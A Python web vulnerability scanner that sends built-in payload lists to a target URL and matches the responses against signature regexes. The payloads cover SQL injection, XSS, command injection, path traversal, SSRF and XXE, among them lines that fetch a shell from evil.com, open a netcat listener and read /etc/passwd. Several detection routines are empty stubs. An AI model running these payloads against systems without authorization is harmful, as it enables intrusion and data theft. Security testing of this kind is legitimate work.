#!/usr/bin/env python3
"""
Vulnerability Scanner Engine
Kombinerar funktionalitet frÃ¥n rengine, adversarial-robustness-toolbox och PayloadsAllTheThings
"""

import asyncio
import logging
import json
import aiohttp
import socket
import ssl
import subprocess
import re
from typing import Dict, Any, Optional, Union, List, Tuple, Set
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime
import xml.etree.ElementTree as ET
from pathlib import Path
import hashlib
import base64

logger = logging.getLogger(__name__)

class VulnerabilityType(Enum):
    """Types of vulnerabilities to scan for"""
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    SSRF = "ssrf"
    XXE = "xxe"
    CSRF = "csrf"
    AUTHENTICATION_BYPASS = "authentication_bypass"
    AUTHORIZATION_BYPASS = "authorization_bypass"
    INFORMATION_DISCLOSURE = "information_disclosure"
    BROKEN_ACCESS_CONTROL = "broken_access_control"
    SECURITY_MISCONFIGURATION = "security_misconfiguration"
    INSECURE_DESERIALIZATION = "insecure_deserialization"
    USING_COMPONENTS_WITH_VULNERABILITIES = "vulnerable_components"
    INSUFFICIENT_LOGGING = "insufficient_logging"

class ScanLevel(Enum):
    """Scan intensity levels"""
    PASSIVE = "passive"
    ACTIVE = "active"
    AGGRESSIVE = "aggressive"

class SeverityLevel(Enum):
    """Vulnerability severity levels"""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"

@dataclass
class Vulnerability:
    """Represents a discovered vulnerability"""
    vuln_id: str
    vuln_type: VulnerabilityType
    severity: SeverityLevel
    title: str
    description: str
    url: str
    parameter: str = ""
    payload: str = ""
    evidence: str = ""
    remediation: str = ""
    references: List[str] = field(default_factory=list)
    cwe_id: str = ""
    cvss_score: float = 0.0
    timestamp: datetime = field(default_factory=datetime.now)

@dataclass
class ScanResult:
    """Results from vulnerability scan"""
    target_url: str
    scan_id: str
    vulnerabilities: List[Vulnerability]
    scan_duration: float
    pages_scanned: int
    requests_made: int
    scan_level: ScanLevel
    timestamp: datetime = field(default_factory=datetime.now)

class VulnerabilityScanner:
    """Advanced vulnerability scanner with multiple detection techniques"""
    
    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or {}
        self.payloads = self._load_payloads()
        self.signatures = self._load_vulnerability_signatures()
        self.session = None
        self.scan_stats = {
            'pages_scanned': 0,
            'requests_made': 0,
            'vulnerabilities_found': 0
        }
        
    def _load_payloads(self) -> Dict[VulnerabilityType, List[str]]:
        """Load attack payloads for different vulnerability types"""
        return {
            VulnerabilityType.SQL_INJECTION: [
                "' OR '1'='1",
                "' UNION SELECT null,null,null--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "'; WAITFOR DELAY '00:00:05'--",
                "' OR pg_sleep(5)--",
                "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
                "' OR (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "admin'/*",
                "admin' #",
                "admin'--",
                "' or 1=1#",
                "' or 1=1--",
                "') or '1'='1--",
                "') or ('1'='1--"
            ],
            VulnerabilityType.XSS: [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "javascript:alert('XSS')",
                "<script>prompt('XSS')</script>",
                "<script>confirm('XSS')</script>",
                "';alert('XSS');//",
                "\"><script>alert('XSS')</script>",
                "'><script>alert('XSS')</script>",
                "<script>alert(String.fromCharCode(88,83,83))</script>",
                "<svg/onload=alert('XSS')>",
                "<iframe/src=javascript:alert('XSS')>"
            ],
            VulnerabilityType.COMMAND_INJECTION: [
                "; ls -la",
                "| whoami",
                "&& cat /etc/passwd",
                "`id`",
                "$(whoami)",
                "; ping -c 4 127.0.0.1",
                "| nc -l 4444",
                "&& wget http://evil.com/shell.php",
                "; curl http://evil.com",
                "| dir",
                "&& type C:\\Windows\\System32\\drivers\\etc\\hosts",
                "; powershell -c whoami",
                "| Get-Process"
            ],
            VulnerabilityType.PATH_TRAVERSAL: [
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
                "..%2f..%2f..%2fetc%2fpasswd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "....\/....\/....\/etc\/passwd",
                "../../../windows/win.ini",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                "..%252f..%252f..%252fetc%252fpasswd"
            ],
            VulnerabilityType.SSRF: [
                "http://127.0.0.1",
                "http://localhost",
                "http://169.254.169.254",
                "http://metadata.google.internal",
                "http://[::1]",
                "file:///etc/passwd",
                "gopher://127.0.0.1:80/",
                "dict://127.0.0.1:11211/",
                "sftp://127.0.0.1/",
                "ldap://127.0.0.1/"
            ],
            VulnerabilityType.XXE: [
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>',
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]><foo></foo>'
            ]
        }
    
    def _load_vulnerability_signatures(self) -> Dict[VulnerabilityType, List[str]]:
        """Load vulnerability detection signatures"""
        return {
            VulnerabilityType.SQL_INJECTION: [
                r"mysql_fetch_array",
                r"ora-\d{5}",
                r"microsoft ole db provider",
                r"syntax error.*mysql",
                r"warning.*mysql",
                r"valid mysql result",
                r"postgresql.*error",
                r"warning.*postgresql",
                r"valid postgresql result",
                r"microsoft sql native client error",
                r"sqlserver jdbc driver",
                r"sqlite_exception",
                r"sqlite error"
            ],
            VulnerabilityType.XSS: [
                r"<script[^>]*>.*?</script>",
                r"javascript:",
                r"on\w+\s*=",
                r"<svg[^>]*onload",
                r"<img[^>]*onerror",
                r"<iframe[^>]*src\s*=\s*['\"]javascript:",
                r"alert\s*\(",
                r"prompt\s*\(",
                r"confirm\s*\("
            ],
            VulnerabilityType.COMMAND_INJECTION: [
                r"uid=\d+\(.*?\)",
                r"root:.*:0:0:",
                r"Microsoft Windows",
                r"Volume Serial Number",
                r"Directory of C:\\",
                r"PING.*bytes of data",
                r"64 bytes from"
            ],
            VulnerabilityType.PATH_TRAVERSAL: [
                r"root:.*:0:0:",
                r"\[boot loader\]",
                r"Windows Registry Editor",
                r"# Configuration file",
                r"/bin/bash",
                r"/bin/sh"
            ],
            VulnerabilityType.INFORMATION_DISCLOSURE: [
                r"phpinfo\(\)",
                r"apache.*server.*port",
                r"server version:",
                r"mysql.*version",
                r"postgresql.*version",
                r"x-powered-by:",
                r"server:",
                r"x-aspnet-version:"
            ]
        }
    
    async def scan_target(self, 
                         target_url: str, 
                         scan_level: ScanLevel = ScanLevel.ACTIVE,
                         vulnerability_types: List[VulnerabilityType] = None) -> ScanResult:
        """Main scanning function"""
        
        scan_id = self._generate_scan_id(target_url)
        start_time = asyncio.get_event_loop().time()
        
        if vulnerability_types is None:
            vulnerability_types = list(VulnerabilityType)
        
        logger.info(f"Starting vulnerability scan for {target_url}")
        logger.info(f"Scan level: {scan_level.value}")
        logger.info(f"Vulnerability types: {[vt.value for vt in vulnerability_types]}")
        
        # Initialize session
        connector = aiohttp.TCPConnector(ssl=False, limit=10)
        timeout = aiohttp.ClientTimeout(total=30)
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={'User-Agent': 'VulnerabilityScanner/1.0'}
        )
        
        vulnerabilities = []
        
        try:
            # Perform different scan types based on level
            if scan_level in [ScanLevel.PASSIVE, ScanLevel.ACTIVE, ScanLevel.AGGRESSIVE]:
                # Basic information gathering
                info_vulns = await self._scan_information_disclosure(target_url)
                vulnerabilities.extend(info_vulns)
                
                # Configuration issues
                config_vulns = await self._scan_security_misconfig(target_url)
                vulnerabilities.extend(config_vulns)
            
            if scan_level in [ScanLevel.ACTIVE, ScanLevel.AGGRESSIVE]:
                # Active vulnerability testing
                for vuln_type in vulnerability_types:
                    if vuln_type in [VulnerabilityType.INFORMATION_DISCLOSURE, 
                                   VulnerabilityType.SECURITY_MISCONFIGURATION]:
                        continue  # Already scanned
                    
                    type_vulns = await self._scan_vulnerability_type(target_url, vuln_type)
                    vulnerabilities.extend(type_vulns)
            
            if scan_level == ScanLevel.AGGRESSIVE:
                # More aggressive testing
                brute_vulns = await self._scan_brute_force(target_url)
                vulnerabilities.extend(brute_vulns)
                
                # Advanced attack vectors
                advanced_vulns = await self._scan_advanced_attacks(target_url)
                vulnerabilities.extend(advanced_vulns)
        
        finally:
            if self.session:
                await self.session.close()
        
        scan_duration = asyncio.get_event_loop().time() - start_time
        
        result = ScanResult(
            target_url=target_url,
            scan_id=scan_id,
            vulnerabilities=vulnerabilities,
            scan_duration=scan_duration,
            pages_scanned=self.scan_stats['pages_scanned'],
            requests_made=self.scan_stats['requests_made'],
            scan_level=scan_level
        )
        
        logger.info(f"Scan completed in {scan_duration:.2f}s")
        logger.info(f"Found {len(vulnerabilities)} vulnerabilities")
        
        return result
    
    async def _scan_vulnerability_type(self, url: str, vuln_type: VulnerabilityType) -> List[Vulnerability]:
        """Scan for specific vulnerability type"""
        vulnerabilities = []
        payloads = self.payloads.get(vuln_type, [])
        signatures = self.signatures.get(vuln_type, [])
        
        for payload in payloads:
            try:
                # Test in different contexts
                test_urls = [
                    f"{url}?test={payload}",
                    f"{url}?id={payload}",
                    f"{url}?search={payload}",
                    f"{url}?query={payload}"
                ]
                
                for test_url in test_urls:
                    vuln = await self._test_payload(test_url, payload, vuln_type, signatures)
                    if vuln:
                        vulnerabilities.append(vuln)
                        break  # Found vulnerability, move to next payload
                        
            except Exception as e:
                logger.warning(f"Error testing payload {payload}: {e}")
                continue
        
        return vulnerabilities
    
    async def _test_payload(self, url: str, payload: str, vuln_type: VulnerabilityType, signatures: List[str]) -> Optional[Vulnerability]:
        """Test a specific payload against target"""
        try:
            async with self.session.get(url) as response:
                self.scan_stats['requests_made'] += 1
                
                if response.status >= 400:
                    return None
                
                response_text = await response.text()
                response_headers = dict(response.headers)
                
                # Check for vulnerability signatures
                for signature in signatures:
                    if re.search(signature, response_text, re.IGNORECASE):
                        severity = self._determine_severity(vuln_type, signature, response_text)
                        
                        return Vulnerability(
                            vuln_id=self._generate_vuln_id(vuln_type, url, payload),
                            vuln_type=vuln_type,
                            severity=severity,
                            title=f"{vuln_type.value.replace('_', ' ').title()} Vulnerability",
                            description=self._get_vulnerability_description(vuln_type),
                            url=url,
                            payload=payload,
                            evidence=signature,
                            remediation=self._get_remediation(vuln_type),
                            cwe_id=self._get_cwe_id(vuln_type)
                        )
                
                # Additional checks based on response characteristics
                if vuln_type == VulnerabilityType.SQL_INJECTION:
                    if self._detect_sql_injection_time_based(response):
                        return Vulnerability(
                            vuln_id=self._generate_vuln_id(vuln_type, url, payload),
                            vuln_type=vuln_type,
                            severity=SeverityLevel.HIGH,
                            title="Time-based SQL Injection",
                            description="Time-based SQL injection vulnerability detected",
                            url=url,
                            payload=payload,
                            evidence="Response delay indicates time-based SQL injection"
                        )
                
                return None
                
        except Exception as e:
            logger.warning(f"Error testing {url} with payload {payload}: {e}")
            return None
    
    async def _scan_information_disclosure(self, url: str) -> List[Vulnerability]:
        """Scan for information disclosure vulnerabilities"""
        vulnerabilities = []
        
        # Test common sensitive files
        sensitive_files = [
            "robots.txt",
            ".htaccess",
            "web.config",
            "config.php",
            "phpinfo.php",
            ".env",
            "backup.sql",
            "database.sql",
            "admin/",
            "admin.php",
            "login.php",
            "config/",
            ".git/config",
            ".svn/entries"
        ]
        
        for file_path in sensitive_files:
            try:
                test_url = f"{url.rstrip('/')}/{file_path}"
                async with self.session.get(test_url) as response:
                    self.scan_stats['requests_made'] += 1
                    
                    if response.status == 200:
                        content = await response.text()
                        
                        if self._is_sensitive_content(content, file_path):
                            vuln = Vulnerability(
                                vuln_id=self._generate_vuln_id(VulnerabilityType.INFORMATION_DISCLOSURE, test_url, ""),
                                vuln_type=VulnerabilityType.INFORMATION_DISCLOSURE,
                                severity=self._determine_file_severity(file_path),
                                title=f"Sensitive File Disclosure: {file_path}",
                                description=f"Sensitive file {file_path} is publicly accessible",
                                url=test_url,
                                evidence=content[:500] if content else "",
                                remediation="Remove or restrict access to sensitive files"
                            )
                            vulnerabilities.append(vuln)
                            
            except Exception as e:
                continue
        
        return vulnerabilities
    
    async def _scan_security_misconfig(self, url: str) -> List[Vulnerability]:
        """Scan for security misconfigurations"""
        vulnerabilities = []
        
        try:
            async with self.session.get(url) as response:
                self.scan_stats['requests_made'] += 1
                headers = dict(response.headers)
                
                # Check for missing security headers
                security_headers = {
                    'X-Frame-Options': 'Clickjacking protection missing',
                    'X-XSS-Protection': 'XSS protection disabled',
                    'X-Content-Type-Options': 'MIME type sniffing allowed',
                    'Strict-Transport-Security': 'HTTPS enforcement missing',
                    'Content-Security-Policy': 'Content Security Policy missing'
                }
                
                for header, description in security_headers.items():
                    if header.lower() not in [h.lower() for h in headers]:
                        vuln = Vulnerability(
                            vuln_id=self._generate_vuln_id(VulnerabilityType.SECURITY_MISCONFIGURATION, url, header),
                            vuln_type=VulnerabilityType.SECURITY_MISCONFIGURATION,
                            severity=SeverityLevel.LOW,
                            title=f"Missing Security Header: {header}",
                            description=description,
                            url=url,
                            evidence=f"Header {header} not found in response",
                            remediation=f"Add {header} header to responses"
                        )
                        vulnerabilities.append(vuln)
                
                # Check for information leakage in headers
                sensitive_headers = ['server', 'x-powered-by', 'x-aspnet-version']
                for header in sensitive_headers:
                    if header in headers:
                        vuln = Vulnerability(
                            vuln_id=self._generate_vuln_id(VulnerabilityType.INFORMATION_DISCLOSURE, url, header),
                            vuln_type=VulnerabilityType.INFORMATION_DISCLOSURE,
                            severity=SeverityLevel.INFO,
                            title=f"Information Disclosure: {header} Header",
                            description=f"Server information disclosed via {header} header",
                            url=url,
                            evidence=f"{header}: {headers[header]}",
                            remediation=f"Remove or obfuscate {header} header"
                        )
                        vulnerabilities.append(vuln)
                        
        except Exception as e:
            logger.warning(f"Error scanning security configuration: {e}")
        
        return vulnerabilities
    
    async def _scan_brute_force(self, url: str) -> List[Vulnerability]:
        """Scan for brute force vulnerabilities"""
        vulnerabilities = []
        
        # Test common admin paths
        admin_paths = [
            "admin/login",
            "administrator",
            "admin.php",
            "login.php",
            "wp-admin",
            "phpmyadmin",
            "admin/",
            "manager/html"
        ]
        
        for path in admin_paths:
            try:
                test_url = f"{url.rstrip('/')}/{path}"
                async with self.session.get(test_url) as response:
                    self.scan_stats['requests_made'] += 1
                    
                    if response.status == 200:
                        content = await response.text().lower()
                        
                        # Look for login forms
                        if ('password' in content and 'login' in content) or \
                           ('username' in content and 'password' in content):
                            vuln = Vulnerability(
                                vuln_id=self._generate_vuln_id(VulnerabilityType.AUTHENTICATION_BYPASS, test_url, ""),
                                vuln_type=VulnerabilityType.AUTHENTICATION_BYPASS,
                                severity=SeverityLevel.MEDIUM,
                                title=f"Exposed Admin Interface: {path}",
                                description="Administrative interface found without apparent protection",
                                url=test_url,
                                evidence="Login form detected",
                                remediation="Implement proper authentication and access controls"
                            )
                            vulnerabilities.append(vuln)
                            
            except Exception:
                continue
        
        return vulnerabilities
    
    async def _scan_advanced_attacks(self, url: str) -> List[Vulnerability]:
        """Scan for advanced attack vectors"""
        vulnerabilities = []
        
        # Test for CSRF
        csrf_vuln = await self._test_csrf(url)
        if csrf_vuln:
            vulnerabilities.append(csrf_vuln)
        
        # Test for insecure deserialization
        deser_vulns = await self._test_deserialization(url)
        vulnerabilities.extend(deser_vulns)
        
        return vulnerabilities
    
    async def _test_csrf(self, url: str) -> Optional[Vulnerability]:
        """Test for CSRF vulnerabilities"""
        # Implementation for CSRF testing
        return None
    
    async def _test_deserialization(self, url: str) -> List[Vulnerability]:
        """Test for insecure deserialization"""
        # Implementation for deserialization testing
        return []
    
    def _detect_sql_injection_time_based(self, response) -> bool:
        """Detect time-based SQL injection"""
        # Implementation for time-based detection
        return False
    
    def _is_sensitive_content(self, content: str, file_path: str) -> bool:
        """Check if content contains sensitive information"""
        sensitive_patterns = {
            'robots.txt': ['disallow:', 'user-agent:'],
            '.htaccess': ['rewriterule', 'deny from'],
            'web.config': ['<configuration>', '<system.web>'],
            '.env': ['password=', 'api_key=', 'secret='],
            'phpinfo.php': ['phpinfo()', 'php version'],
            '.git/config': ['[core]', 'repositoryformatversion']
        }
        
        patterns = sensitive_patterns.get(file_path.lower(), [])
        content_lower = content.lower()
        
        return any(pattern in content_lower for pattern in patterns)
    
    def _determine_severity(self, vuln_type: VulnerabilityType, signature: str, response: str) -> SeverityLevel:
        """Determine vulnerability severity"""
        severity_map = {
            VulnerabilityType.SQL_INJECTION: SeverityLevel.HIGH,
            VulnerabilityType.XSS: SeverityLevel.MEDIUM,
            VulnerabilityType.COMMAND_INJECTION: SeverityLevel.CRITICAL,
            VulnerabilityType.PATH_TRAVERSAL: SeverityLevel.HIGH,
            VulnerabilityType.SSRF: SeverityLevel.HIGH,
            VulnerabilityType.XXE: SeverityLevel.HIGH,
            VulnerabilityType.INFORMATION_DISCLOSURE: SeverityLevel.LOW
        }
        
        return severity_map.get(vuln_type, SeverityLevel.MEDIUM)
    
    def _determine_file_severity(self, file_path: str) -> SeverityLevel:
        """Determine severity based on file type"""
        critical_files = ['.env', 'config.php', 'database.sql', '.git/config']
        high_files = ['web.config', '.htaccess', 'backup.sql']
        
        if any(cf in file_path.lower() for cf in critical_files):
            return SeverityLevel.CRITICAL
        elif any(hf in file_path.lower() for hf in high_files):
            return SeverityLevel.HIGH
        else:
            return SeverityLevel.MEDIUM
    
    def _get_vulnerability_description(self, vuln_type: VulnerabilityType) -> str:
        """Get description for vulnerability type"""
        descriptions = {
            VulnerabilityType.SQL_INJECTION: "SQL injection vulnerabilities allow attackers to execute malicious SQL commands",
            VulnerabilityType.XSS: "Cross-site scripting allows injection of malicious scripts into web pages",
            VulnerabilityType.COMMAND_INJECTION: "Command injection allows execution of arbitrary system commands",
            VulnerabilityType.PATH_TRAVERSAL: "Path traversal allows access to files outside the web root",
            VulnerabilityType.SSRF: "Server-side request forgery allows making requests to internal resources"
        }
        return descriptions.get(vuln_type, "Vulnerability detected")
    
    def _get_remediation(self, vuln_type: VulnerabilityType) -> str:
        """Get remediation advice for vulnerability type"""
        remediations = {
            VulnerabilityType.SQL_INJECTION: "Use parameterized queries and input validation",
            VulnerabilityType.XSS: "Implement output encoding and Content Security Policy",
            VulnerabilityType.COMMAND_INJECTION: "Avoid system calls with user input, use safe APIs",
            VulnerabilityType.PATH_TRAVERSAL: "Validate and sanitize file paths, use allow lists",
            VulnerabilityType.SSRF: "Validate URLs, use allow lists for destinations"
        }
        return remediations.get(vuln_type, "Follow secure coding practices")
    
    def _get_cwe_id(self, vuln_type: VulnerabilityType) -> str:
        """Get CWE ID for vulnerability type"""
        cwe_map = {
            VulnerabilityType.SQL_INJECTION: "CWE-89",
            VulnerabilityType.XSS: "CWE-79",
            VulnerabilityType.COMMAND_INJECTION: "CWE-78",
            VulnerabilityType.PATH_TRAVERSAL: "CWE-22",
            VulnerabilityType.SSRF: "CWE-918",
            VulnerabilityType.XXE: "CWE-611"
        }
        return cwe_map.get(vuln_type, "CWE-1000")
    
    def _generate_scan_id(self, target_url: str) -> str:
        """Generate unique scan ID"""
        timestamp = datetime.now().isoformat()
        return hashlib.md5(f"{target_url}_{timestamp}".encode()).hexdigest()[:12]
    
    def _generate_vuln_id(self, vuln_type: VulnerabilityType, url: str, payload: str) -> str:
        """Generate unique vulnerability ID"""
        data = f"{vuln_type.value}_{url}_{payload}"
        return hashlib.md5(data.encode()).hexdigest()[:16]

# Convenience functions
async def quick_vulnerability_scan(target_url: str) -> ScanResult:
    """Quick vulnerability scan with default settings"""
    scanner = VulnerabilityScanner()
    return await scanner.scan_target(target_url)

async def comprehensive_scan(target_url: str) -> ScanResult:
    """Comprehensive vulnerability scan"""
    scanner = VulnerabilityScanner()
    return await scanner.scan_target(target_url, ScanLevel.AGGRESSIVE)

if __name__ == "__main__":
    # Test the vulnerability scanner
    async def test_scanner():
        scanner = VulnerabilityScanner()
        
        # Test with a safe target
        test_url = "https://httpbin.org"
        result = await scanner.scan_target(test_url, ScanLevel.PASSIVE)
        
        print(f"Scan completed for {result.target_url}")
        print(f"Duration: {result.scan_duration:.2f}s")
        print(f"Vulnerabilities found: {len(result.vulnerabilities)}")
        
        for vuln in result.vulnerabilities:
            print(f"- {vuln.title} ({vuln.severity.value})")
    
    asyncio.run(test_scanner())
